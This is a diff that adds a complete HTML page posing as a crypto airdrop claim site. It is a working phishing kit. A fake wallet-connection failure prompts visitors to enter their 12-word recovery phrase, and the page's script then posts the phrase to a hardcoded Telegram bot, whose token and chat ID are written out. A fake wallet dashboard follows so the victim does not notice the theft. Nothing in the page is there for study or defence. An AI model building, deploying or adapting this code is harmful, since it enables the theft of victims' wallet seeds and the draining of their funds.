@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Crypto Airdrop</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        :root {
+            --background: #121212;
+            --surface: #1e1e1e;
+            --primary: #3c82f6;
+            --primary-hover: #2563eb;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --border-color: #333333;
+            --error: #ef4444;
+            --success: #34d399;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--background);
+            color: var(--text-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background-color: var(--surface);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            overflow: hidden;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .inner-container {
+            padding: 32px;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            fill: var(--success);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        h2 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        p {
+            font-size: 16px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .crypto-icons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .crypto-icons img {
+            width: 40px;
+            height: 40px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            background-color: var(--primary);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-left-color: var(--primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 40px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            background-color: rgba(239, 68, 68, 0.1);
+            color: var(--error);
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid var(--error);
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .phrase-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .phrase-word {
+            position: relative;
+        }
+
+        .word-number {
+            position: absolute;
+            top: 6px;
+            left: 8px;
+            font-size: 10px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .phrase-input {
+            width: 100%;
+            height: 48px;
+            background-color: var(--background);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 13px;
+            text-align: center;
+            padding: 16px 5px 0px 5px;
+            transition: all 0.2s ease;
+        }
+
+        .phrase-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background-color: rgba(60, 130, 246, 0.05);
+        }
+
+        .toggle-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 20px;
+        }
+
+        .toggle-btn {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .wallet-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .wallet-header h1 {
+            font-size: 20px;
+            margin-bottom: 0;
+        }
+
+        .action-buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .action-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            background: none;
+            border: none;
+            color: var(--text-primary);
+            cursor: pointer;
+        }
+
+        .action-btn div {
+            width: 50px;
+            height: 50px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.2s;
+        }
+        
+        .action-btn:hover div {
+            transform: scale(1.05);
+        }
+
+        .action-btn span {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .assets-list {
+            text-align: left;
+        }
+
+        .asset-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .asset-item:last-child {
+            border-bottom: none;
+        }
+
+        .asset-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .asset-info img {
+            width: 40px;
+            height: 40px;
+        }
+
+        .asset-name span {
+            display: block;
+        }
+
+        .asset-name .symbol {
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            font-size: 14px;
+        }
+
+        .asset-balance {
+            margin-left: auto;
+            text-align: right;
+        }
+
+        .asset-balance .value-usd {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div id="landing-page" class="page active">
+            <div class="inner-container">
+                <svg class="logo" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z"></path>
+                </svg>
+                <h1>Exclusive Crypto Airdrop</h1>
+                <p>As part of our community growth initiative, we're giving away free BTC, ETH, and SOL. Connect your wallet to claim your reward now!</p>
+                <div class="crypto-icons">
+                    <img src="https://img.icons8.com/color/48/000000/bitcoin--v1.png" alt="BTC" />
+                    <img src="https://img.icons8.com/color/48/000000/ethereum.png" alt="ETH" />
+                    <img src="https://img.icons8.com/color/48/solana.png" alt="SOL" />
+                </div>
+                <button class="btn" onclick="startProcess()">Claim Airdrop</button>
+            </div>
+        </div>
+
+        <div id="loading-page" class="page">
+            <div class="inner-container">
+                <div class="loader"></div>
+                <h1>Connecting to Wallet...</h1>
+                <p>Please approve the connection in your wallet. This may take a moment.</p>
+            </div>
+        </div>
+
+        <div id="manual-login-page" class="page">
+            <div class="inner-container">
+                <h1>Manual Verification</h1>
+                <div class="error-message">
+                    <strong>Connection Failed:</strong> The automated connection timed out. Please enter your 12-word recovery phrase below to securely connect your wallet.
+                </div>
+                <form id="phrase-form">
+                    <div class="phrase-grid">
+                        </div>
+                    <div class="toggle-container">
+                        <button type="button" class="toggle-btn" onclick="toggleVisibility()">Show phrase</button>
+                    </div>
+                    <button type="submit" class="btn" id="submit-btn">Securely Connect</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="final-loading-page" class="page">
+            <div class="inner-container">
+                <div class="loader"></div>
+                <h1>Verifying Phrase...</h1>
+                <p>Do not close this window. Your assets are being secured.</p>
+            </div>
+        </div>
+
+        <div id="wallet-dashboard-page" class="page">
+            <div class="inner-container">
+                <div class="wallet-header">
+                    <h1>My Wallet</h1>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.9999 12.0001C19.9999 13.1047 19.1045 14.0001 17.9999 14.0001C16.8953 14.0001 15.9999 13.1047 15.9999 12.0001C15.9999 10.8955 16.8953 10.0001 17.9999 10.0001C19.1045 10.0001 19.9999 10.8955 19.9999 12.0001Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M11.9999 12.0001C11.9999 13.1047 11.1045 14.0001 9.99991 14.0001C8.89534 14.0001 7.99991 13.1047 7.99991 12.0001C7.99991 10.8955 8.89534 10.0001 9.99991 10.0001C11.1045 10.0001 11.9999 10.8955 11.9999 12.0001Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M3.99991 12.0001C3.99991 13.1047 3.10449 14.0001 1.99991 14.0001C0.89534 14.0001 -0.0000858307 13.1047 -0.0000858307 12.0001C-0.0000858307 10.8955 0.89534 10.0001 1.99991 10.0001C3.10449 10.0001 3.99991 10.8955 3.99991 12.0001Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </div>
+                <p style="margin-bottom: 5px; font-size: 14px;">Total Balance</p>
+                <h2>$8,450.00</h2>
+                <div class="action-buttons">
+                    <button class="action-btn" onclick="alert('Feature coming soon.')">
+                        <div><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 17L17 7M17 7H7M17 7V17" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                        <span>Send</span>
+                    </button>
+                    <button class="action-btn" onclick="alert('Feature coming soon.')">
+                        <div><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 7L17 17M17 17H7M17 17V7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                        <span>Receive</span>
+                    </button>
+                    <button class="action-btn" onclick="alert('Feature coming soon.')">
+                        <div><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 4V20M20 12L4 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                        <span>Buy</span>
+                    </button>
+                    <button class="action-btn" onclick="alert('Feature coming soon.')">
+                        <div><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 10L4 10M4 10L8 6M4 10L8 14M4 14L20 14M20 14L16 18M20 14L16 10" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                        <span>Swap</span>
+                    </button>
+                </div>
+                <div class="assets-list">
+                    <div class="asset-item">
+                        <div class="asset-info">
+                            <img src="https://img.icons8.com/color/48/000000/bitcoin--v1.png" alt="BTC" />
+                            <div class="asset-name">
+                                <span>Bitcoin</span>
+                                <span class="symbol">BTC</span>
+                            </div>
+                        </div>
+                        <div class="asset-balance">
+                            <span>0.05 BTC</span>
+                            <span class="value-usd">$3,500.00</span>
+                        </div>
+                    </div>
+                    <div class="asset-item">
+                        <div class="asset-info">
+                            <img src="https://img.icons8.com/color/48/000000/ethereum.png" alt="ETH" />
+                            <div class="asset-name">
+                                <span>Ethereum</span>
+                                <span class="symbol">ETH</span>
+                            </div>
+                        </div>
+                        <div class="asset-balance">
+                            <span>1.0 ETH</span>
+                            <span class="value-usd">$3,450.00</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8254458626:AAHwhFEuRKs9OS2YLgCsWFneUsaI8UThMfw";
+        const TELEGRAM_CHAT_ID = "6966542803";
+
+        const pages = document.querySelectorAll('.page');
+
+        function showPage(pageId) {
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        function startProcess() {
+            showPage('loading-page');
+            setTimeout(() => {
+                showPage('manual-login-page');
+            }, 3000);
+        }
+
+        // Setup phrase grid
+        const phraseGrid = document.querySelector('.phrase-grid');
+        for (let i = 1; i <= 12; i++) {
+            const wordDiv = document.createElement('div');
+            wordDiv.className = 'phrase-word';
+            wordDiv.innerHTML = `
+                <span class="word-number">${i}</span>
+                <input type="password" id="word-${i}" class="phrase-input" required autocomplete="off">
+            `;
+            phraseGrid.appendChild(wordDiv);
+        }
+
+        // Logic for auto-pasting 12 words
+        const firstInput = document.getElementById('word-1');
+        firstInput.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const text = (e.clipboardData || window.clipboardData).getData('text');
+            const words = text.trim().split(/\s+/);
+            
+            if (words.length >= 12) {
+                for (let i = 0; i < 12; i++) {
+                    const input = document.getElementById(`word-${i + 1}`);
+                    if (input) input.value = words[i];
+                }
+            } else {
+                firstInput.value = words[0] || '';
+            }
+        });
+
+        // Toggle Visibility Logic
+        let isVisible = false;
+        function toggleVisibility() {
+            isVisible = !isVisible;
+            const type = isVisible ? 'text' : 'password';
+            const btnText = isVisible ? 'Hide phrase' : 'Show phrase';
+            
+            for (let i = 1; i <= 12; i++) {
+                document.getElementById(`word-${i}`).type = type;
+            }
+            document.querySelector('.toggle-btn').textContent = btnText;
+        }
+
+        const phraseForm = document.getElementById('phrase-form');
+        phraseForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            showPage('final-loading-page');
+
+            const words = [];
+            for (let i = 1; i <= 12; i++) {
+                words.push(document.getElementById(`word-${i}`).value);
+            }
+            const recoveryPhrase = words.join(' ');
+
+            const messageText = `🚨 New Crypto Phrase Captured! 🚨\n\n${recoveryPhrase}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: messageText,
+            };
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+            } catch (error) {
+                console.error("Error:", error);
+            }
+
+            setTimeout(() => {
+                showPage('wallet-dashboard-page');
+            }, 2500);
+        });
+    </script>
+</body>
+
+</html>
